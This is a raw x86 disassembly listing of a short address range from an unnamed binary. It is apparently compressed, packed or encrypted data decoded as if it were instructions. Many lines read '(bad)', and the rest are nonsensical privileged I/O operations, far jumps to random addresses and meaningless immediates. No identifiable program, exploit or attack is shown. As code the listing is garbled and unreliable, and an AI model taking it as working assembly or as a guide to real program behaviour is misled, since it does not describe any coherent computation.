  41bb3d:	popf   
  41bb3e:	(bad)
  41bb42:	sti    
  41bb43:	sub    DWORD PTR [ecx+0x56fd92c3],0xffffff96
  41bb4a:	std    
  41bb4b:	push   0xffffffae
  41bb4d:	jle    0x41baee
  41bb4f:	or     eax,0x6e75165e
  41bb54:	or     cl,BYTE PTR [edi-0x2951629]
  41bb5a:	mov    edx,0x485646bb
  41bb5f:	into   
  41bb60:	cs pop ebx
  41bb62:	mov    bl,0x73
  41bb64:	stos   BYTE PTR es:[edi],al
  41bb65:	or     esi,DWORD PTR [ecx]
  41bb67:	mov    edi,0x7fe32f82
  41bb6c:	pop    esi
  41bb6d:	sub    al,0x1f
  41bb6f:	xchg   esi,eax
  41bb70:	jne    0x41bbe0
  41bb72:	adc    ebx,DWORD PTR [ebx+0x4e24dd80]
  41bb78:	aam    0x48
  41bb7a:	sbb    BYTE PTR [esi-0x36],bl
  41bb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb7e:	scas   eax,DWORD PTR es:[edi]
  41bb7f:	fwait
  41bb80:	pop    edi
  41bb81:	inc    edi
  41bb82:	sahf   
  41bb83:	stos   BYTE PTR es:[edi],al
  41bb84:	push   ss
  41bb85:	xchg   ebp,eax
  41bb86:	fld    QWORD PTR [esi-0x1f]
  41bb89:	fisttp QWORD PTR [edx]
  41bb8b:	in     eax,0x1
  41bb8d:	ror    BYTE PTR [ebp+0x33],cl
  41bb90:	adc    dl,al
  41bb92:	adc    eax,0xf52d5f6
  41bb97:	add    eax,DWORD PTR [esi-0x29]
  41bb9a:	cmp    esp,0xffffffe8
  41bb9d:	shr    DWORD PTR [ecx+0x586eb15a],1
  41bba3:	cmp    cl,BYTE PTR [eax+0xc]
  41bba6:	push   ss
  41bba7:	mov    bh,BYTE PTR [edx-0xc44240f]
  41bbad:	or     BYTE PTR [ecx+0x45],cl
  41bbb0:	sbb    ebx,ecx
  41bbb2:	adc    al,0xe0
  41bbb4:	clc    
  41bbb5:	dec    ecx
  41bbb6:	(bad)  
  41bbb7:	push   0x33505625
  41bbbc:	enter  0x206a,0xd7
  41bbc0:	mov    dl,0x98
  41bbc2:	sbb    ah,BYTE PTR [eax+edi*8]
  41bbc5:	jge    0x41bb9a
  41bbc7:	icebp  
  41bbc8:	outs   dx,DWORD PTR ds:[esi]
  41bbc9:	cwde   
  41bbca:	scas   al,BYTE PTR es:[edi]
  41bbcb:	dec    eax
  41bbcc:	push   ds
  41bbcd:	mov    edi,0x1ce4c8b7
  41bbd2:	mov    al,ds:0x8bf09e9f
  41bbd7:	(bad)  
  41bbd9:	cld    
  41bbda:	jl     0x41bbd4
  41bbdc:	xchg   ecx,eax
  41bbdd:	fsubr  DWORD PTR [ecx+0x89ca6f4]
  41bbe3:	(bad)  
  41bbe5:	adc    cl,BYTE PTR ds:0x3351fa8
  41bbeb:	out    0x3e,eax
  41bbed:	xor    eax,0x58ca1b7f
  41bbf2:	ret    
  41bbf3:	or     BYTE PTR [esp+ebp*2+0x1d0a13da],ch
  41bbfa:	add    DWORD PTR [ecx],ecx
  41bbfc:	add    edi,DWORD PTR [ebp+0x6c]
  41bbff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc00:	mov    esp,0xe5b03d7d
  41bc05:	leave  
  41bc06:	imul   ebx,DWORD PTR [edi+0x7dae750b],0xa0e384fe
  41bc10:	pop    esp
  41bc11:	xor    al,0x9f
  41bc13:	outs   dx,DWORD PTR ds:[esi]
  41bc14:	pop    ss
  41bc15:	rol    al,1
  41bc17:	push   esp
  41bc18:	mov    eax,0x2f933595
  41bc1d:	or     eax,DWORD PTR [edi-0x68]
  41bc20:	xchg   esi,eax
  41bc21:	out    0xd7,al
  41bc23:	cmc    
  41bc24:	ret    0xf9a4
  41bc27:	mov    edx,eax
  41bc29:	and    DWORD PTR [edx-0x3],edi
  41bc2c:	je     0x41bc4b
  41bc2e:	mov    ds:0x70d2e39f,eax
  41bc33:	repnz jecxz 0x41bc22
  41bc36:	fs jmp 0x8a75:0xff4cc8a0
  41bc3e:	stos   DWORD PTR es:[edi],eax
  41bc3f:	dec    edi
  41bc40:	push   ecx
  41bc41:	jne    0x41bcbe
  41bc43:	ret    0xda66
  41bc46:	retf   
  41bc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc48:	fdiv   DWORD PTR [ebx+0x75ca0091]
  41bc4e:	stos   DWORD PTR es:[edi],eax
  41bc4f:	pop    ecx
  41bc50:	in     al,0x8f
  41bc52:	push   esp
  41bc53:	inc    esi
  41bc54:	mov    ds:0x39b5cd07,eax
  41bc59:	cmp    al,0x44
  41bc5b:	or     al,0x20
  41bc5d:	or     BYTE PTR [edi-0x3fe138c2],ah
  41bc63:	push   ecx
  41bc64:	ds inc esi
  41bc66:	xchg   esi,eax
  41bc67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc68:	sub    BYTE PTR [eax+0x3b],bh
  41bc6b:	cmp    ch,BYTE PTR [esi]
  41bc6d:	jo     0x41bced
  41bc6f:	xor    al,0xeb
  41bc71:	push   ebx
  41bc72:	push   ecx
  41bc73:	ret    
  41bc74:	(bad)  
  41bc75:	cmp    DWORD PTR [edi+ebx*8],0x2
  41bc79:	loope  0x41bc46
  41bc7b:	nop
  41bc7c:	xor    ebp,ebx
  41bc7e:	sbb    al,0x67
  41bc80:	xchg   edi,eax
  41bc81:	xor    cl,dh
  41bc83:	(bad)  
  41bc84:	not    BYTE PTR [ecx]
  41bc86:	and    dl,BYTE PTR [ecx]
  41bc88:	mov    BYTE PTR [eax+eiz*8],ch
  41bc8b:	mov    dh,0x40
  41bc8d:	test   al,0x9f
  41bc8f:	dec    eax
  41bc90:	cli    
  41bc91:	mov    cl,0x7f
  41bc93:	mov    al,ds:0x6cb4e180
  41bc98:	xlat   BYTE PTR ds:[ebx]
  41bc99:	in     al,dx
  41bc9a:	add    edx,DWORD PTR [edi+0x71421448]
  41bca0:	and    eax,0x45b77854
  41bca5:	nop
  41bca6:	mov    eax,ds:0xb987d561
  41bcab:	sar    DWORD PTR ds:0x4802eebc,cl
  41bcb1:	and    DWORD PTR [esi*2-0xfff8e28],ebx
  41bcb8:	dec    DWORD PTR [esi-0x7f]
  41bcbb:	mov    ebp,esp
  41bcbd:	push   ebp
  41bcbe:	inc    eax
  41bcbf:	pop    ebp
  41bcc0:	lods   al,BYTE PTR ds:[esi]
  41bcc1:	and    esi,DWORD PTR ds:0x3523c197
  41bcc7:	outs   dx,BYTE PTR ds:[esi]
  41bcc8:	ins    BYTE PTR es:[edi],dx
  41bcc9:	je     0x41bc88
  41bccb:	inc    eax
  41bccc:	daa    
  41bccd:	jp     0x41bccf
  41bccf:	mov    bh,0xdf
  41bcd1:	pusha  
  41bcd2:	mov    ebx,ecx
  41bcd4:	mov    cl,0x82
  41bcd6:	fcomp  DWORD PTR [ecx-0x46]
  41bcd9:	push   edx
  41bcda:	push   ss
  41bcdb:	in     eax,dx
  41bcdc:	xchg   edx,eax
  41bcdd:	and    eax,0xacec62c7
  41bce2:	adc    esi,DWORD PTR [edi]
  41bce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bce5:	cmp    al,0x92
  41bce7:	or     al,0x53
  41bce9:	arpl   sp,si
  41bceb:	out    dx,al
  41bcec:	dec    ebx
  41bced:	in     al,0x33
  41bcef:	addr16 mov dl,0xc7
  41bcf2:	add    al,0xa7
  41bcf4:	mov    ecx,0x83e77646
  41bcf9:	sub    al,0xf3
  41bcfb:	inc    esp
  41bcfc:	(bad)  
  41bcfe:	cdq    
  41bcff:	and    ebx,DWORD PTR [eax-0x6f]
  41bd02:	sahf   
  41bd03:	adc    DWORD PTR [eax],esp
  41bd05:	mov    ds:0x5ded304f,eax
  41bd0a:	loopne 0x41bd7c
  41bd0c:	pop    ebp
  41bd0d:	xchg   DWORD PTR [ebx-0x3d],ecx
  41bd10:	dec    eax
  41bd11:	mov    ch,0xdd
  41bd13:	xlat   BYTE PTR ds:[ebx]
  41bd14:	mov    cl,0x33
  41bd16:	sbb    ebp,DWORD PTR [esi+0x1a24af29]
  41bd1c:	jl     0x41bd60
  41bd1e:	push   cs
  41bd1f:	mov    cl,0x6d
  41bd21:	mov    eax,ds:0xb112b365
  41bd26:	test   al,0xd7
  41bd28:	out    dx,eax
  41bd29:	jns    0x41bcdf
  41bd2b:	mov    es,WORD PTR [ecx+0x66091ac6]
  41bd31:	out    dx,eax
  41bd32:	dec    edx
  41bd33:	dec    ebp
  41bd34:	test   eax,0x5b3d2b40
  41bd39:	jge    0x41bd7a
  41bd3b:	rcl    DWORD PTR [esi+0x69efd218],0xc7
  41bd42:	and    al,0x3a
  41bd44:	adc    BYTE PTR [ebp+0x37],ch
  41bd47:	mov    DWORD PTR [ebp+0x3c],0xc28ba200
  41bd4e:	dec    DWORD PTR [edi-0x70]
  41bd51:	int    0xf9
  41bd53:	jl     0x41bd84
  41bd55:	sub    al,0xa9
  41bd57:	mov    edi,0x3fd51350
  41bd5c:	xlat   BYTE PTR ds:[ebx]
  41bd5d:	push   0x47
  41bd5f:	jl     0x41bd6b
  41bd61:	push   ecx
  41bd62:	cmp    ebp,DWORD PTR [esi+0x34]
  41bd65:	iret   
  41bd66:	sub    al,0xba
  41bd68:	xchg   ebp,eax
  41bd69:	lock jecxz 0x41bcee
  41bd6c:	les    ebx,FWORD PTR [ecx+0x20b1e127]
  41bd72:	mov    dl,0x4
  41bd74:	aam    0x3d
  41bd76:	and    al,0x4e
  41bd78:	mov    al,ds:0x487e8106
  41bd7d:	adc    esi,DWORD PTR [esp+ebp*1-0x200fd7a9]
  41bd84:	mov    dl,BYTE PTR [edx-0xa]
  41bd87:	pop    eax
  41bd88:	mov    ebx,0xabe99d4
  41bd8d:	add    eax,0x505e4619
  41bd92:	icebp  
  41bd93:	mov    ecx,eax
  41bd95:	inc    eax
  41bd96:	mov    ah,0xb6
  41bd98:	jae    0x41bd95
  41bd9a:	test   eax,0xa71c3eb5
  41bd9f:	cwde   
  41bda0:	dec    ecx
  41bda1:	add    dh,BYTE PTR ds:0x8d15f843
  41bda7:	xchg   ecx,eax
  41bda8:	aaa    
  41bda9:	inc    ecx
  41bdaa:	hlt    
  41bdab:	jg     0x41bdbd
  41bdad:	cwde   
  41bdae:	lahf   
  41bdaf:	cmp    ch,BYTE PTR [edx-0x35]
  41bdb2:	addr16 mov bl,0x16
  41bdb5:	lods   eax,DWORD PTR ds:[esi]
  41bdb6:	push   cs
  41bdb7:	sub    dl,bh
  41bdb9:	add    edx,DWORD PTR [edi]
  41bdbb:	pop    edi
  41bdbc:	aas    
  41bdbd:	cmc    
  41bdbe:	jne    0x41bd45
  41bdc0:	mov    cl,0xee
  41bdc2:	push   DWORD PTR [ebp-0x5d9a612]
  41bdc8:	stos   DWORD PTR es:[edi],eax
  41bdc9:	jp     0x41bdad
  41bdcb:	out    dx,al
  41bdcc:	in     eax,0x2
  41bdce:	jbe    0x41be3f
  41bdd0:	xlat   BYTE PTR ds:[ebx]
  41bdd1:	or     eax,0x692e40c6
  41bdd6:	adc    BYTE PTR [edi+0x7c66e1c5],ah
  41bddc:	jmp    0xad5b5d9a
  41bde1:	or     eax,0x3fb8c79b
  41bde6:	xchg   esp,eax
  41bde7:	fidivr WORD PTR [eax]
  41bde9:	mov    ah,0xec
  41bdeb:	call   0x3da474bb
  41bdf0:	jae    0x41be03
  41bdf2:	add    ebx,DWORD PTR [ecx]
  41bdf4:	push   0xffffffe5
  41bdf6:	out    dx,eax
  41bdf7:	sbb    DWORD PTR [esi],ecx
  41bdf9:	pop    ss
  41bdfa:	hlt    
  41bdfb:	mov    esp,0x4878414d
  41be00:	shl    BYTE PTR [edx-0x5],cl
  41be03:	mov    eax,DWORD PTR [esi]
  41be05:	cmp    bh,BYTE PTR [edi-0x68]
  41be08:	pusha  
  41be09:	cs call 0xc338ec75
  41be0f:	xor    eax,0xc2736c7e
  41be14:	jp     0x41bdcb
  41be16:	aas    
  41be17:	pop    esp
  41be18:	imul   edi,DWORD PTR [ebx-0x45],0x9616f9f4
  41be1f:	in     al,0xaf
  41be21:	repz loope 0x41be08
  41be24:	test   eax,0x48a758a0
  41be29:	fistp  WORD PTR [edi-0x11]
  41be2c:	test   DWORD PTR [eax+0x2b],ebp
  41be2f:	imul   edx,eax,0xffffffba
  41be32:	pop    ebp
  41be33:	xchg   ebp,eax
  41be34:	in     eax,dx
  41be35:	dec    ebx
  41be36:	fs sbb eax,0x7bfef94d
  41be3c:	mov    al,0x72
  41be3e:	retf   
  41be3f:	jo     0x41be3a
  41be41:	pushf  
  41be42:	xchg   DWORD PTR [ebx],eax
  41be44:	sub    edx,DWORD PTR [edi]
  41be46:	outs   dx,DWORD PTR ds:[esi]
  41be47:	stos   BYTE PTR es:[edi],al
  41be48:	pusha  
  41be49:	xchg   ebp,eax
  41be4a:	jmp    0x41bde2
  41be4c:	push   ss
  41be4d:	in     eax,dx
  41be4e:	fsub   st(7),st
  41be50:	push   ebp
  41be51:	xor    DWORD PTR [esi+eax*8+0x54],eax
  41be55:	adc    DWORD PTR [ecx],edx
  41be57:	or     eax,DWORD PTR [edx]
  41be59:	push   0x5b
  41be5b:	cmp    al,0xae
  41be5d:	mov    BYTE PTR [edx],bh
  41be5f:	sbb    BYTE PTR [ecx+0xa],al
  41be62:	fxch   st(3)
  41be64:	mov    ebp,0xe9b9f8c
  41be69:	(bad)  
  41be6a:	scas   al,BYTE PTR es:[edi]
  41be6b:	loop   0x41be7a
  41be6d:	ret    
  41be6e:	aam    0xeb
  41be70:	mov    dl,0xe0
  41be72:	or     bl,BYTE PTR [ecx+0x7574878a]
  41be78:	popf   
  41be79:	pushf  
  41be7a:	jmp    0x41befa
  41be7c:	mov    DWORD PTR [edi-0x2b861002],edi
  41be82:	out    dx,al
  41be83:	popf   
  41be84:	fbld   TBYTE PTR [edi-0x32]
  41be87:	or     eax,0xe969ab8b
  41be8c:	add    al,0x28
  41be8e:	sub    al,0x67
  41be90:	ss mov dl,0x1b
  41be93:	mov    dh,0x4f
  41be95:	push   esi
  41be96:	(bad)  
  41be97:	imul   edi,DWORD PTR [ecx],0xffffffc7
  41be9a:	test   eax,0xdb2cea6a
  41be9f:	xchg   ebp,eax
  41bea0:	jp     0x41be6c
  41bea2:	adc    BYTE PTR [ebp+0x3a],al
  41bea5:	adc    bl,ch
  41bea7:	mov    esp,es
  41bea9:	(bad)  [edi+0x42]
  41beac:	fcom   DWORD PTR ds:[edi+0x47]
  41beb0:	add    esi,ecx
  41beb2:	iret   
  41beb3:	lods   al,BYTE PTR ds:[esi]
  41beb4:	jnp    0x41bf2d
  41beb6:	mov    ds,WORD PTR [edi+0x4b]
  41beb9:	push   edx
  41beba:	fdiv   QWORD PTR [ebx]
  41bebc:	and    al,0x72
  41bebe:	xchg   edx,eax
  41bebf:	add    ecx,DWORD PTR [edi-0x6f]
  41bec2:	mov    ch,0x92
  41bec4:	loopne 0x41bece
  41bec6:	cmp    edx,ebx
  41bec8:	xchg   edx,esp
  41beca:	dec    edi
  41becb:	retf   0x6e69
  41bece:	out    dx,al
  41becf:	xrelease mov DWORD PTR [ecx+0x5b],esp
  41bed3:	div    ebx
  41bed5:	enter  0x9c1b,0xb7
  41bed9:	(bad)  
  41beda:	push   ecx
  41bedb:	mov    al,0x7f
  41bedd:	mov    ss,WORD PTR [edx-0x4c]
  41bee0:	sbb    al,0x8e
  41bee2:	loope  0x41becb
  41bee4:	shl    BYTE PTR [edx],0xe7
  41bee7:	jp     0x41be78
  41bee9:	mov    ecx,0x1357237
  41beee:	mov    ch,0x9a
  41bef0:	mov    ecx,0x60c59976
  41bef5:	scas   eax,DWORD PTR es:[edi]
  41bef6:	inc    ebx
  41bef7:	mov    dh,0x88
  41bef9:	jae    0x41beda
  41befb:	sbb    dh,dl
  41befd:	out    0x29,eax
  41beff:	rcl    DWORD PTR cs:[eax],1
  41bf02:	xchg   esi,eax
  41bf03:	cmp    DWORD PTR [esi+0x62613dd0],ecx
  41bf09:	cmp    ebp,edi
  41bf0b:	popf   
  41bf0c:	mov    dh,0xc9
  41bf0e:	lods   al,BYTE PTR ds:[esi]
  41bf0f:	(bad)  
  41bf10:	jg     0x41bf11
  41bf12:	sub    DWORD PTR [ebp-0x6],0x55826245
  41bf19:	xor    bl,BYTE PTR [esi]
  41bf1b:	adc    al,0x61
  41bf1d:	inc    ebx
  41bf1e:	xor    cl,bh
  41bf20:	cld    
  41bf21:	ins    DWORD PTR es:[edi],dx
  41bf22:	(bad)  
  41bf24:	xor    al,0xd0
  41bf26:	pushf  
  41bf27:	(bad)  
  41bf28:	jl     0x41bf55
  41bf2a:	scas   eax,DWORD PTR es:[edi]
  41bf2b:	test   ah,cl
  41bf2d:	cmp    edx,DWORD PTR cs:[edi+0x70e2d052]
  41bf34:	pop    ebx
  41bf35:	repz jnp 0x41bf19
  41bf38:	shl    BYTE PTR [ebx+0x75f9d7ff],cl
  41bf3e:	mov    ch,0x88
  41bf40:	rol    DWORD PTR [edi],1
  41bf42:	loop   0x41bf14
  41bf44:	imul   ecx,DWORD PTR [ebx+0x46],0xb68c84c
  41bf4b:	pop    edi
  41bf4c:	enter  0x465b,0x77
  41bf50:	ins    DWORD PTR es:[edi],dx
  41bf51:	(bad)  
  41bf52:	aas    
  41bf53:	mov    eax,ds:0x9120367
  41bf58:	icebp  
  41bf59:	xchg   ecx,eax
  41bf5a:	mov    ebx,0xe4f7a66
  41bf5f:	xor    DWORD PTR [esi],ebx
  41bf61:	(bad)  
  41bf62:	fisubr DWORD PTR [eax]
  41bf64:	test   DWORD PTR [ecx+0x68],esp
  41bf67:	sub    al,0x71
  41bf69:	int3   
  41bf6a:	std    
  41bf6b:	adc    esi,DWORD PTR [ebp-0x24d5bb59]
  41bf71:	mov    dl,0xea
  41bf73:	stc    
  41bf74:	jge    0x41bfab
  41bf76:	arpl   WORD PTR [edx+ebx*1+0x32],si
  41bf7a:	jp     0x41bf32
  41bf7c:	pop    ebp
  41bf7d:	mov    bl,0xad
  41bf7f:	xor    dh,BYTE PTR [eax+0x2ec157db]
  41bf85:	sbb    al,0xa4
  41bf87:	sbb    esi,DWORD PTR [ebx+0x7c]
  41bf8a:	push   0x3cb73209
  41bf8f:	xchg   esp,eax
  41bf90:	fs out 0x5f,eax
  41bf93:	xchg   ebp,eax
  41bf94:	inc    ebx
  41bf95:	in     al,dx
  41bf96:	jne    0x41bf7c
  41bf98:	or     eax,0xaf87b282
  41bf9d:	add    dh,al
  41bf9f:	stos   BYTE PTR es:[edi],al
  41bfa0:	jns    0x41bf24
  41bfa2:	mov    ah,0x3b
  41bfa4:	pop    ds
  41bfa5:	push   0x37d3d09b
  41bfaa:	sbb    eax,0xa557e453
  41bfaf:	arpl   WORD PTR [edi+edi*2],sp
  41bfb2:	sub    DWORD PTR [ebp-0x30],edx
  41bfb5:	adc    esp,ecx
  41bfb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfb8:	sbb    DWORD PTR [edi+0x7e],ebx
  41bfbb:	mov    eax,0x45948284
  41bfc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfc1:	or     ch,BYTE PTR [esi+0x4616c7cd]
  41bfc7:	adc    eax,0x51580dcd
  41bfcc:	pushf  
  41bfcd:	popa   
  41bfce:	xor    eax,0xd4d55a1c
  41bfd3:	nop
  41bfd4:	jmp    0x2fa38d62
  41bfd9:	into   
  41bfda:	jae    0x41c044
  41bfdc:	jo     0x41c01a
  41bfde:	xchg   DWORD PTR [eax*2-0x12e6fc86],ecx
  41bfe5:	(bad)  
  41bfe7:	xor    al,0xc3
  41bfe9:	jbe    0x41c02d
  41bfeb:	(bad)  
  41bfed:	sub    al,0xb7
  41bfef:	fmul   DWORD PTR [edi]
  41bff1:	(bad)  
  41bff2:	jnp    0x41bfde
  41bff4:	outs   dx,DWORD PTR ds:[esi]
  41bff5:	test   DWORD PTR [esi+esi*8-0x11],0x63311b8d
  41bffd:	aaa    
  41bffe:	or     bl,dl
  41c000:	aas    
  41c001:	and    esi,edx
  41c003:	add    eax,0x442d2f11
  41c008:	push   0xf73e8850
  41c00d:	(bad)  
  41c010:	shl    DWORD PTR [ebx+0x52bddafa],0x85
  41c017:	xchg   edx,eax
  41c018:	pop    esp
  41c019:	jge    0x41bff8
  41c01b:	es xchg ebp,eax
  41c01d:	(bad)  
  41c01f:	ss push 0xffffff9a
  41c022:	cmc    
  41c023:	xchg   ebx,eax
  41c024:	and    BYTE PTR [edx+0x35b67c82],cl
  41c02a:	lds    esp,FWORD PTR [ebx+0x5f417939]
  41c030:	std    
  41c031:	aad    0xc7
  41c033:	iret   
  41c034:	imul   ebp,DWORD PTR [ebx+0x7dd9c37b],0x70b92f12
  41c03e:	or     al,0xd7
  41c040:	cwde   
  41c041:	in     eax,0x47
  41c043:	(bad)  
  41c044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c045:	retf   
  41c046:	cmp    BYTE PTR [ecx-0x1a9a8dfc],dl
  41c04c:	popf   
  41c04d:	adc    BYTE PTR [ebp+0x63],bl
  41c050:	jae    0x41bfdf
  41c052:	jmp    0x41c000
  41c054:	jae    0x41bff4
  41c056:	iret   
  41c057:	gs out 0x77,eax
  41c05a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c05b:	jle    0x41c08a
  41c05d:	loop   0x41c092
  41c05f:	cli    
  41c060:	adc    BYTE PTR ds:[edi],0x25
  41c064:	repz lahf 
  41c066:	pop    esp
  41c067:	or     eax,0xd6bea4a
  41c06c:	adc    BYTE PTR [edi-0x12f88bac],dh
  41c072:	xor    DWORD PTR [ecx-0x1cda0e1e],esp
  41c078:	sub    BYTE PTR [esi-0xb29d4ac],0xb4
  41c07f:	push   eax
  41c080:	dec    edi
  41c081:	xor    BYTE PTR [edi+0x51],dl
  41c084:	dec    esi
  41c085:	push   ebx
  41c086:	pop    ebp
  41c087:	ss jnp 0x41c00a
  41c08a:	sub    al,0x4e
  41c08c:	inc    esi
  41c08d:	mov    eax,0x570ddc80
  41c092:	test   ch,dh
  41c094:	cmp    edi,DWORD PTR [ecx-0x152a9956]
  41c09a:	out    0xa1,al
  41c09c:	dec    ebp
  41c09d:	mov    dh,0x63
  41c09f:	fmul   DWORD PTR cs:[edx-0x1b]
  41c0a3:	add    DWORD PTR [eax+0x11],ebp
  41c0a6:	pop    DWORD PTR [ebp-0xe]
  41c0a9:	nop
  41c0aa:	or     ecx,DWORD PTR [edi]
  41c0ac:	cmc    
  41c0ad:	(bad)  
  41c0ae:	cmp    eax,0x6ce7cb9e
  41c0b3:	mov    al,ds:0x19689689
  41c0b8:	and    DWORD PTR [edx+ebx*2+0x8],edi
  41c0bc:	xor    eax,0x181d81f6
  41c0c1:	jmp    0xd4eb:0xf6a5ef50
  41c0c8:	shr    DWORD PTR [edi+0x63],0xcc
  41c0cc:	push   edx
  41c0cd:	adc    al,0x94
  41c0cf:	inc    ecx
  41c0d0:	push   esp
  41c0d1:	mov    dl,0xe3
  41c0d3:	push   edx
  41c0d4:	dec    eax
  41c0d5:	mov    al,BYTE PTR [edi]
  41c0d7:	pop    ebx
  41c0d8:	adc    ebp,DWORD PTR [ebp+0x1f]
  41c0db:	dec    eax
  41c0dc:	ret    0x6118
  41c0df:	nop
  41c0e0:	xor    BYTE PTR [edi-0x7d],ah
  41c0e3:	stos   DWORD PTR es:[edi],eax
  41c0e4:	mov    ah,0xad
  41c0e6:	mov    eax,ds:0xcac441
  41c0eb:	push   0xe04acfb3
  41c0f0:	jno    0x41c0d8
  41c0f2:	fwait
  41c0f3:	or     ecx,DWORD PTR [esi-0x43cf966b]
  41c0f9:	enter  0x50d0,0xe6
  41c0fd:	mov    BYTE PTR [edi+0x1a],al
  41c100:	mov    ecx,0x6eaf8bb
  41c105:	xchg   esp,eax
  41c106:	(bad)  [esi]
  41c108:	push   edx
  41c109:	inc    eax
  41c10a:	mov    al,ds:0x12b6a04e
  41c10f:	stos   DWORD PTR es:[edi],eax
  41c110:	cmp    al,0xe1
  41c112:	sar    DWORD PTR ds:0x1af9d390,cl
  41c118:	add    DWORD PTR [eax-0x45],esi
  41c11b:	sbb    dl,BYTE PTR [ebx-0x52]
  41c11e:	shr    DWORD PTR [ecx+ebp*8+0x14c570ec],cl
  41c125:	push   edx
  41c126:	outs   dx,DWORD PTR ds:[esi]
  41c127:	xchg   ecx,eax
  41c128:	xchg   esp,eax
  41c129:	jg     0x41c0f3
  41c12b:	sub    al,0x13
  41c12d:	js     0x41c0f3
  41c12f:	sub    al,0xeb
  41c131:	rcr    ah,cl
  41c133:	daa    
  41c134:	push   ss
  41c135:	xchg   edi,eax
  41c136:	dec    ebx
  41c137:	cmp    DWORD PTR [edx-0x9931b08],ebp
  41c13d:	and    esi,DWORD PTR [edx-0x54]
  41c140:	inc    edi
  41c141:	xchg   edx,eax
  41c142:	dec    edi
  41c143:	sar    DWORD PTR [eax+0x1955728c],1
  41c149:	(bad)  
  41c14a:	popf   
  41c14b:	jmp    0x74794a37
  41c150:	jmp    0x1e1a:0xa028b0ec
  41c157:	mov    al,ds:0x7fdf3d64
  41c15c:	sbb    eax,0x3ad6b3c7
  41c161:	xchg   edx,eax
  41c162:	(bad)
  41c165:	repz inc edi
  41c167:	and    ebp,DWORD PTR [ebp-0x60b9f3f]
  41c16d:	push   0x1b
  41c16f:	aam    0xb7
  41c171:	xchg   edi,eax
  41c172:	push   edx
  41c173:	cs repnz (bad) 
  41c177:	bound  eax,QWORD PTR [ebx-0x1c]
  41c17a:	stos   BYTE PTR es:[edi],al
  41c17b:	shr    BYTE PTR [esi+ebx*1+0x44463a6c],1
  41c182:	ja     0x41c196
  41c184:	adc    eax,esp
  41c186:	dec    ebp
  41c187:	jl     0x41c188
  41c189:	xchg   ebx,eax
  41c18a:	add    BYTE PTR [eax-0x4f],0xa8
  41c18e:	jp     0x41c1cf
  41c190:	sub    DWORD PTR [ecx*4+0x7d1ccb7],0x5a
  41c198:	dec    esi
  41c199:	retf   0x39ea
  41c19c:	retf   0x2cae
  41c19f:	push   esi
  41c1a0:	frstor [eax-0x1d]
  41c1a3:	or     bh,BYTE PTR [edx]
  41c1a5:	adc    al,0x8a
  41c1a7:	and    edi,eax
  41c1a9:	pushf  
  41c1aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1ab:	and    BYTE PTR [ebp-0x69],ah
  41c1ae:	fwait
  41c1af:	scas   eax,DWORD PTR es:[edi]
  41c1b0:	pop    ebx
  41c1b1:	mov    dh,0xe5
  41c1b3:	sbb    al,0x6f
  41c1b5:	es icebp 
  41c1b7:	sub    esi,DWORD PTR [eax]
  41c1b9:	ds xchg edx,eax
  41c1bb:	and    DWORD PTR [eax],0x221509a2
  41c1c1:	adc    DWORD PTR [esi-0x587dcc38],esi
  41c1c7:	outs   dx,BYTE PTR ds:[esi]
  41c1c8:	outs   dx,BYTE PTR ds:[esi]
  41c1c9:	std    
  41c1ca:	in     al,dx
  41c1cb:	fnstcw WORD PTR [esi+0x6da1700a]
  41c1d1:	sub    ebp,DWORD PTR [ebp-0x75eb407e]
  41c1d7:	push   ebx
  41c1d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1d9:	mov    gs,WORD PTR [ebx-0x5d]
  41c1dc:	sahf   
  41c1dd:	fisttp WORD PTR [eax+0x50]
  41c1e0:	dec    edi
  41c1e1:	into   
  41c1e2:	scas   eax,DWORD PTR es:[edi]
  41c1e3:	cwde   
  41c1e4:	sub    DWORD PTR [eax],ebx
  41c1e6:	inc    ebx
  41c1e7:	rcl    DWORD PTR [esi+0x431aa4fb],0x94
  41c1ee:	mov    esp,0x391ec120
  41c1f3:	(bad)  
  41c1f4:	iret   
  41c1f5:	pop    ebp
  41c1f6:	mov    ss,WORD PTR [edx]
  41c1f8:	pop    edi
  41c1f9:	inc    esi
  41c1fa:	loope  0x41c239
  41c1fc:	cmp    esp,DWORD PTR [esi-0x2c]
  41c1ff:	into   
  41c200:	sub    DWORD PTR ds:0xe81c9b78,ebx
  41c206:	mov    ecx,ebp
  41c208:	retf   0xf2e3
  41c20b:	imul   eax,DWORD PTR [esi],0xffffff8a
  41c20e:	stos   DWORD PTR es:[edi],eax
  41c20f:	xor    eax,0xe8db9e63
  41c214:	push   ecx
  41c215:	sbb    DWORD PTR [edi],esp
  41c217:	scas   al,BYTE PTR es:[edi]
  41c218:	jecxz  0x41c1a1
  41c21a:	xchg   ebp,eax
  41c21b:	shl    BYTE PTR [ebx],1
  41c21d:	loope  0x41c224
  41c21f:	sub    BYTE PTR ds:0x13869719,bh
  41c225:	xor    ebx,eax
  41c227:	out    0xd5,al
  41c229:	ss popa 
  41c22b:	test   BYTE PTR [esi-0x6faf2905],0xa2
  41c232:	jl     0x41c219
  41c234:	mov    DWORD PTR [esi+0x6c],ebp
  41c237:	jg     0x41c28d
  41c239:	xor    ebx,ebp
  41c23b:	gs push eax
  41c23d:	sahf   
  41c23e:	cld    
  41c23f:	cmp    DWORD PTR [ebx*4-0x14fec108],0x12
  41c247:	jbe    0x41c2bc
  41c249:	adc    eax,esp
  41c24b:	add    BYTE PTR [eax],0x4d
  41c24e:	in     al,0x41
  41c250:	mov    edx,0x341cbbe2
  41c255:	adc    DWORD PTR [edx-0x6cdae92],edx
  41c25b:	out    0x45,eax
  41c25d:	sub    esp,edx
  41c25f:	loope  0x41c26a
  41c261:	jge    0x41c2e0
  41c263:	fiadd  WORD PTR [eax+0x26d86959]
  41c269:	repz push 0x371cce7d
  41c26f:	bound  eax,QWORD PTR [ebx+0x59edafbd]
  41c275:	(bad)  
  41c276:	(bad)  
